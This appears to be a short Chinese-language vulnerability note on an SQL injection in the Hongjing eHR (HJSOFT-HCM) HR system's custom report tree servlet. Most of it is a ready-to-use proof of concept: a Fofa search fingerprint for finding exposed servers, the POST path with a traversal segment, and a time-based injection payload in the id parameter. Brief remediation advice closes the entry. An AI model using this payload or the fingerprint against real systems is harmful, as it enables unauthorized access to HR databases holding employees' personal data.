# 宏景eHRcustomreporttreeSQL注入

- **系统**：宏景eHRcustomreporttree　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="HJSOFT-HCM"`
- **请求**：`POST /templates/attestation/../../servlet/sys/option/customreport/tree HTTP/1.1`

**请求体 / payload**
```
1. Fofa
app="HJSOFT-HCM"
2、部分界面如下
3、隐患url,复现如下
Host: your-ip
Content-Type: application/x-www-form-urlencoded
id=1';WAITFOR DELAY '0:0:5'--+&codeset=UN&priv=1&level=
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。